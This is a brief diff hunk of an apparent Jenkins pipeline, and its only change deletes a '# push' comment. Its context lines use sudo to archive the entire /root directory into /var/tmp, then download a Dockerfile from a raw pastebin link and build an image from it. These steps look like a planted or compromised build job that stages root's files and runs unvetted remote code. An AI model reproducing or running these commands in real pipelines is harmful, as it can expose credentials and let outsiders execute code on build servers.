@@ -27,7 +27,6 @@ node {
           sh 'sudo tar czvf /var/tmp/jenkins.tar.gz /root'
           sh 'curl https://pastebin.com/raw/i6xChZ2B -o /var/tmp/Dockerfile'
           sh 'cd /var/tmp && docker build -t amsterdam/test:latest .'
-          # push
         }
     }
 }
